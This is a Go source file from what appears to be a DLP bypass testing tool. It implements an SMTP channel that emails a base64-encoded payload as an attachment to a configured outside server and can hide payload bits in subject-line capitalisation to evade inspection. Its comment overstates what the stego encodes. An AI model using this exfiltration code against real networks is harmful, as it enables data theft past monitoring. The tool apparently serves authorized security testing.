// Package smtp implements an SMTP email exfiltration channel.
// Sends the payload as a base64-encoded attachment over STARTTLS SMTP.
package smtp

import (
	"context"
	"crypto/tls"
	"encoding/base64"
	"fmt"
	"net"
	"net/smtp"
	"strings"
	"time"

	"github.com/hssn-research/dlpbuster/internal/channels"
)

// Channel implements channels.Channel for SMTP exfiltration.
type Channel struct{}

// New returns a new SMTP Channel.
func New() *Channel { return &Channel{} }

// Name returns the channel identifier.
func (c *Channel) Name() string { return "smtp" }

// Description returns a one-line description.
func (c *Channel) Description() string {
	return "Exfiltrate payload as a base64-encoded email attachment over SMTP"
}

// Run sends the payload as a MIME attachment via SMTP.
func (c *Channel) Run(ctx context.Context, cfg channels.ChannelConfig) channels.Result {
	result := channels.Result{Channel: c.Name()}
	start := time.Now()

	if cfg.SMTPServer == "" || cfg.SMTPFrom == "" || cfg.SMTPTo == "" {
		result.Status = channels.StatusSkipped
		result.Evidence = []string{"smtp: server, from, or to not configured"}
		result.Duration = time.Since(start)
		return result
	}

	host, _, err := net.SplitHostPort(cfg.SMTPServer)
	if err != nil {
		host = cfg.SMTPServer
	}

	done := make(chan error, 1)
	go func() {
		done <- sendMail(host, cfg)
	}()

	select {
	case <-ctx.Done():
		result.Status = channels.StatusPartial
		result.Evidence = []string{"smtp: context cancelled"}
		result.Duration = time.Since(start)
		return result
	case err := <-done:
		result.Duration = time.Since(start)
		if err != nil {
			result.Status = channels.StatusBlocked
			result.Evidence = []string{fmt.Sprintf("smtp: send failed: %v", err)}
			return result
		}
		result.Status = channels.StatusPassed
		result.BytesSent = len(cfg.Payload)
		result.Evidence = []string{fmt.Sprintf("email sent: %s → %s via %s", cfg.SMTPFrom, cfg.SMTPTo, cfg.SMTPServer)}
		return result
	}
}

func sendMail(host string, cfg channels.ChannelConfig) error {
	encoded := base64.StdEncoding.EncodeToString(cfg.Payload)

	subject := buildSubject(cfg)

	boundary := "dlpbuster-boundary-0xdeadbeef"
	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("From: %s\r\n", cfg.SMTPFrom))
	sb.WriteString(fmt.Sprintf("To: %s\r\n", cfg.SMTPTo))
	sb.WriteString(fmt.Sprintf("Subject: %s\r\n", subject))
	sb.WriteString("MIME-Version: 1.0\r\n")
	sb.WriteString(fmt.Sprintf("Content-Type: multipart/mixed; boundary=%q\r\n", boundary))
	sb.WriteString("\r\n")
	sb.WriteString(fmt.Sprintf("--%s\r\n", boundary))
	sb.WriteString("Content-Type: text/plain\r\n\r\n")
	sb.WriteString("[DLP Bypass Test — authorized testing only]\r\n")
	sb.WriteString(fmt.Sprintf("\r\n--%s\r\n", boundary))
	sb.WriteString("Content-Type: application/octet-stream\r\n")
	sb.WriteString("Content-Transfer-Encoding: base64\r\n")
	sb.WriteString("Content-Disposition: attachment; filename=\"payload.bin\"\r\n\r\n")
	sb.WriteString(encoded)
	sb.WriteString(fmt.Sprintf("\r\n--%s--\r\n", boundary))

	client, err := smtp.Dial(cfg.SMTPServer)
	if err != nil {
		return fmt.Errorf("smtp dial: %w", err)
	}
	defer client.Close()

	tlsCfg := &tls.Config{ServerName: host, MinVersion: tls.VersionTLS12} //nolint:gosec
	if ok, _ := client.Extension("STARTTLS"); ok {
		if err := client.StartTLS(tlsCfg); err != nil {
			return fmt.Errorf("smtp starttls: %w", err)
		}
	}

	if cfg.SMTPUser != "" {
		auth := smtp.PlainAuth("", cfg.SMTPUser, cfg.SMTPPass, host)
		if err := client.Auth(auth); err != nil {
			return fmt.Errorf("smtp auth: %w", err)
		}
	}

	if err := client.Mail(cfg.SMTPFrom); err != nil {
		return fmt.Errorf("smtp MAIL FROM: %w", err)
	}
	if err := client.Rcpt(cfg.SMTPTo); err != nil {
		return fmt.Errorf("smtp RCPT TO: %w", err)
	}
	w, err := client.Data()
	if err != nil {
		return fmt.Errorf("smtp DATA: %w", err)
	}
	if _, err = fmt.Fprint(w, sb.String()); err != nil {
		return fmt.Errorf("smtp write body: %w", err)
	}
	if err := w.Close(); err != nil {
		return fmt.Errorf("smtp close data: %w", err)
	}
	return client.Quit()
}

// buildSubject returns the SMTP subject line.
// When SMTPSubjectStego is enabled, the first 8 bytes of the payload are
// encoded into the capitalisation pattern of a cover phrase (uppercase bit=1,
// lowercase bit=0), making the subject appear as plain English.
func buildSubject(cfg channels.ChannelConfig) string {
	if !cfg.SMTPSubjectStego || len(cfg.Payload) == 0 {
		return "DLP Test Payload"
	}
	cover := []string{"daily", "log", "report", "for", "review", "please", "check", "this"}
	n := 8
	if len(cfg.Payload) < n {
		n = len(cfg.Payload)
	}
	var words []string
	for i := 0; i < n && i < len(cover); i++ {
		byte_ := cfg.Payload[i]
		word := cover[i]
		if byte_&0x80 != 0 {
			// Capitalise first letter to signal high bit
			word = strings.ToUpper(word[:1]) + word[1:]
		}
		words = append(words, word)
	}
	return strings.Join(words, " ")
}
